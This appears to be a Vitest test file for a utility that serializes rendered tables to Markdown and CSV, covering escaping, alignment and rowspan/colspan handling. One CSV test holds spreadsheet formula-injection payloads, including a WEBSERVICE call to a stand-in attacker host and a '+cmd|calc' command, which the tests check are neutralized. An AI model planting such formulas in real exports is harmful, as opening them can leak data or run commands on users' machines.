import { describe, it, expect } from 'vitest'
import { unified } from 'unified'
import remarkParse from 'remark-parse'
import remarkGfm from 'remark-gfm'
import remarkRehype from 'remark-rehype'
import rehypeRaw from 'rehype-raw'
import type { Element as HastElement, Root } from 'hast'
import { hastTableToCsv, hastTableToMarkdown } from '../utils/tableClipboard'

/** The hast `<table>` for a markdown snippet, produced by the same
 *  remark-gfm → rehype path the renderer uses, so the serializer is tested
 *  against the node shape it actually receives (thead/tbody, `align`
 *  properties, whitespace text nodes between rows). */
function tableNode(md: string): HastElement {
  const tree = unified().use(remarkParse).use(remarkGfm).use(remarkRehype, { allowDangerousHtml: true }).use(rehypeRaw).runSync(unified().use(remarkParse).use(remarkGfm).parse(md)) as Root
  const find = (n: { type: string; tagName?: string; children?: unknown[] }): HastElement | null => {
    if (n.type === 'element' && n.tagName === 'table') return n as HastElement
    for (const c of (n.children ?? []) as { type: string; tagName?: string; children?: unknown[] }[]) {
      const hit = find(c)
      if (hit) return hit
    }
    return null
  }
  const table = find(tree)
  if (!table) throw new Error('no table in fixture')
  return table
}

describe('hastTableToMarkdown', () => {
  it('round-trips a plain GFM table', () => {
    const md = ['| Symbol | Price |', '| --- | --- |', '| GOOGL | $344.82 |', '| AAPL | $189.10 |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(md)
  })

  it('preserves column alignment in the delimiter row', () => {
    const md = ['| Left | Center | Right |', '| :--- | :---: | ---: |', '| a | b | c |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(md)
  })

  it('restates inline formatting and escapes pipes inside cells', () => {
    const md = ['| Flag | Meaning |', '| --- | --- |', '| `--force` | **Overwrites** the *existing* file, ~~or not~~ |', '| `a \\| b` | [docs](https://example.com/x) |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(md)
  })

  it('collapses a <br> and internal newlines to one space so a cell stays one line', () => {
    const md = ['| Note |', '| --- |', '| first<br>second |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| Note |', '| --- |', '| first second |'].join('\n'))
  })

  it('pads short rows to the header width', () => {
    // remark-gfm itself pads, so drive this through a raw-HTML table.
    const md = '<table><tr><th>A</th><th>B</th><th>C</th></tr><tr><td>1</td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| A | B | C |', '| --- | --- | --- |', '| 1 |  |  |'].join('\n'))
  })

  it('promotes the first row of a headerless raw-HTML table to the header', () => {
    const md = '<table><tbody><tr><td>k</td><td>v</td></tr><tr><td>x</td><td>1</td></tr></tbody></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| k | v |', '| --- | --- |', '| x | 1 |'].join('\n'))
  })

  it('returns an empty string for a table with no cells', () => {
    expect(hastTableToMarkdown(tableNode('<table></table>'))).toBe('')
  })

  it('keeps columns aligned under a rowspan: covered slots become empty cells', () => {
    // Row 2 has only ONE cell, because "Fruit" spans down into it. Without the
    // grid that cell would land in column 1 and read as a category.
    const md = [
      '<table>',
      '<tr><th>Category</th><th>Item</th></tr>',
      '<tr><td rowspan="2">Fruit</td><td>Apple</td></tr>',
      '<tr><td>Pear</td></tr>',
      '<tr><td>Veg</td><td>Leek</td></tr>',
      '</table>',
    ].join('')
    expect(hastTableToMarkdown(tableNode(md))).toBe([
      '| Category | Item |',
      '| --- | --- |',
      '| Fruit | Apple |',
      '|  | Pear |',
      '| Veg | Leek |',
    ].join('\n'))
  })

  it('keeps columns aligned under a colspan', () => {
    const md = [
      '<table>',
      '<tr><th colspan="2">Pair</th><th>Total</th></tr>',
      '<tr><td>1</td><td>2</td><td>3</td></tr>',
      '</table>',
    ].join('')
    expect(hastTableToMarkdown(tableNode(md))).toBe([
      '| Pair |  | Total |',
      '| --- | --- | --- |',
      '| 1 | 2 | 3 |',
    ].join('\n'))
  })

  it('clamps a hostile span to the HTML limit instead of spinning', () => {
    const md = '<table><tr><th colspan="1000000000" rowspan="1000000000">A</th></tr><tr><td>b</td></tr></table>'
    const started = Date.now()
    const out = hastTableToMarkdown(tableNode(md))
    expect(Date.now() - started).toBeLessThan(2000)
    // The header spans 1000 columns, as the browser would render it; the second
    // row sits under the rowspan so `b` lands in column 1001, making the table
    // 1001 columns wide (1002 pipes) -- not a billion.
    const rows = out.split('\n')
    expect((rows[0].match(/\|/g) ?? []).length).toBe(1002)
    expect(rows[2].startsWith('|  | ')).toBe(true)
    expect(rows[2].endsWith('| b |')).toBe(true)
  })

  it('treats a negative or non-numeric span as 1', () => {
    const md = '<table><tr><th colspan="-3">B</th><th rowspan="x">C</th></tr><tr><td>2</td><td>3</td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| B | C |', '| --- | --- |', '| 2 | 3 |'].join('\n'))
  })

  it('reads rowspan="0" as "to the end of this row group", as HTML does', () => {
    const md = '<table><tbody><tr><td rowspan="0">k</td><td>1</td></tr><tr><td>2</td></tr><tr><td>3</td></tr></tbody></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| k | 1 |', '| --- | --- |', '|  | 2 |', '|  | 3 |'].join('\n'))
  })

  it('does not let a rowspan bleed from one row group into the next', () => {
    // The browser clamps the thead rowspan at the thead's last row, so the
    // tbody's first cell must land in column 0, not be pushed to column 1.
    const md = '<table><thead><tr><th rowspan="5">H</th><th>B</th></tr></thead><tbody><tr><td>1</td><td>2</td></tr></tbody></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| H | B |', '| --- | --- |', '| 1 | 2 |'].join('\n'))
  })

  it('treats a run of bare <tr> as one implicit row group', () => {
    const md = '<table><tr><td rowspan="2">a</td><td>b</td></tr><tr><td>c</td></tr><tbody><tr><td>d</td><td>e</td></tr></tbody></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| a | b |', '| --- | --- |', '|  | c |', '| d | e |'].join('\n'))
  })

  it('escapes literal Markdown metacharacters so they do not re-parse as formatting', () => {
    const md = ['| Name | Note |', '| --- | --- |', '| \\_\\_init\\_\\_ | \\*not italic\\* and \\[x\\] and \\<b\\> and \\~\\~x\\~\\~ |'].join('\n')
    const out = hastTableToMarkdown(tableNode(md))
    expect(out).toBe(['| Name | Note |', '| --- | --- |', '| \\_\\_init\\_\\_ | \\*not italic\\* and \\[x\\] and \\<b\\> and \\~\\~x\\~\\~ |'].join('\n'))
    // And the round trip is stable: parsing the output yields the same text.
    expect(hastTableToMarkdown(tableNode(out))).toBe(out)
  })

  it('keeps runs of spaces and tabs inside a code span, collapsing only prose whitespace', () => {
    const md = '<table><tr><th>Code</th></tr><tr><td>say  <code>a  b\tc</code>  now</td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| Code |', '| --- |', '| say `a  b\tc` now |'].join('\n'))
  })

  it('pads a code span that begins and ends with a space so the second parse keeps them', () => {
    // CommonMark strips one space from each end of a span that has both, so
    // `` ` a ` `` would come back as `a`; the extra pair is what gets stripped.
    const md = '<table><tr><th>Code</th></tr><tr><td><code> a </code> and <code>   </code></td></tr></table>'
    const out = hastTableToMarkdown(tableNode(md))
    expect(out).toBe(['| Code |', '| --- |', '| `  a  ` and `   ` |'].join('\n'))
    expect(hastTableToMarkdown(tableNode(out))).toBe(out)
  })

  it('leaves code-span content unescaped and still fences it', () => {
    const md = ['| Code |', '| --- |', '| `a_b*c[d]` |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(md)
  })

  it('wraps a link destination containing parentheses in angle brackets', () => {
    const md = ['| Ref |', '| --- |', '| [wiki](<https://en.wikipedia.org/wiki/Foo_(bar)>) |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(md)
  })

  it('escapes literal URLs, emails and entity text the way mdast-util-gfm-autolink-literal does', () => {
    // remark-gfm autolinks bare URLs in a post-parse pass, so a literal-URL
    // TEXT node only arises from other producers (raw HTML through rehype-raw,
    // hast built by an app). Build the node directly: the escapes emitted are
    // the ones the reference serializer uses, and `&` becomes `\&` so the
    // literal string `&amp;` cannot decode to `&` on the second parse.
    const cell = (text: string): HastElement => ({ type: 'element', tagName: 'td', properties: {}, children: [{ type: 'text', value: text }] })
    const table: HastElement = { type: 'element', tagName: 'table', properties: {}, children: [
      { type: 'element', tagName: 'tr', properties: {}, children: [{ ...cell('Text'), tagName: 'th' }] },
      { type: 'element', tagName: 'tr', properties: {}, children: [cell('see http://example.test and www.example.test or mail a@b.co; A &amp; B')] },
    ] }
    expect(hastTableToMarkdown(table)).toBe(['| Text |', '| --- |', '| see http\\://example.test and www\\.example.test or mail a\\@b.co; A \\&amp; B |'].join('\n'))
    expect(hastTableToCsv(table)).toBe('Text\nsee http://example.test and www.example.test or mail a@b.co; A &amp; B')
  })

  it('percent-encodes angle brackets inside a link destination', () => {
    const md = '<table><tr><th>Ref</th></tr><tr><td><a href="https://x.test/q?a=<b>">go</a></td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| Ref |', '| --- |', '| [go](https://x.test/q?a=%3Cb%3E) |'].join('\n'))
  })

  it('handles a rowspan on the last column followed by a short row', () => {
    const md = '<table><tr><th>A</th><th>B</th></tr><tr><td>1</td><td rowspan="2">x</td></tr><tr><td>2</td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| A | B |', '| --- | --- |', '| 1 | x |', '| 2 |  |'].join('\n'))
  })

  it('handles overlapping rowspans in two different columns', () => {
    const md = '<table><tr><td rowspan="2">a</td><td>b</td><td rowspan="3">c</td></tr><tr><td>d</td></tr><tr><td>e</td><td>f</td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| a | b | c |', '| --- | --- | --- |', '|  | d |  |', '| e | f |  |'].join('\n'))
  })

  it('widens the header to the longest row when a body row has more cells', () => {
    const md = '<table><tr><th>A</th></tr><tr><td>1</td><td>2</td></tr></table>'
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| A |  |', '| --- | --- |', '| 1 | 2 |'].join('\n'))
  })

  it('fences inline code that itself contains a backtick', () => {
    const md = ['| Code |', '| --- |', '| `` a`b `` |'].join('\n')
    expect(hastTableToMarkdown(tableNode(md))).toBe(['| Code |', '| --- |', '| ``a`b`` |'].join('\n'))
  })
})

describe('hastTableToCsv', () => {
  it('emits one line per row with plain-text cells', () => {
    const md = ['| Flag | Meaning |', '| --- | --- |', '| `verbose` | **Prints** the file |'].join('\n')
    expect(hastTableToCsv(tableNode(md))).toBe('Flag,Meaning\nverbose,Prints the file')
  })

  it('neutralizes formula-leading fields so a paste cannot evaluate them', () => {
    const md = ['| Input |', '| --- |', '| =WEBSERVICE("https://evil.example/x") |', '| @SUM(A1:A9) |', '| +cmd\\|calc |', '| -2+3 |', '| --force |'].join('\n')
    expect(hastTableToCsv(tableNode(md))).toBe([
      'Input',
      `"'=WEBSERVICE(""https://evil.example/x"")"`,
      "'@SUM(A1:A9)",
      "'+cmd|calc",
      "'-2+3",
      "'--force",
    ].join('\n'))
  })

  it('leaves plain numbers bare, including negative and percentage values', () => {
    const md = ['| Delta |', '| --- |', '| -0.57 |', '| +3% |', '| -1,234.5 |'].join('\n')
    // The comma still earns RFC 4180 quotes; the value itself is not marked as text.
    expect(hastTableToCsv(tableNode(md))).toBe('Delta\n-0.57\n+3%\n"-1,234.5"')
  })

  it('quotes fields that contain a comma or a quote, doubling inner quotes', () => {
    const md = ['| Name | Quote |', '| --- | --- |', '| Doe, Jane | She said "hi" |'].join('\n')
    expect(hastTableToCsv(tableNode(md))).toBe('Name,Quote\n"Doe, Jane","She said ""hi"""')
  })

  it('does not escape pipes -- they are not special in CSV', () => {
    const md = ['| Expr |', '| --- |', '| a \\| b |'].join('\n')
    expect(hastTableToCsv(tableNode(md))).toBe('Expr\na | b')
  })

  it('keeps an author line break as a quoted newline, since a CSV field can hold one', () => {
    const md = ['| Note |', '| --- |', '| first<br>second |'].join('\n')
    expect(hastTableToCsv(tableNode(md))).toBe('Note\n"first\nsecond"')
  })

  it('emits an empty field where a rowspan covers the slot', () => {
    const md = '<table><tr><th>A</th><th>B</th></tr><tr><td rowspan="2">x</td><td>1</td></tr><tr><td>2</td></tr></table>'
    expect(hastTableToCsv(tableNode(md))).toBe('A,B\nx,1\n,2')
  })
})
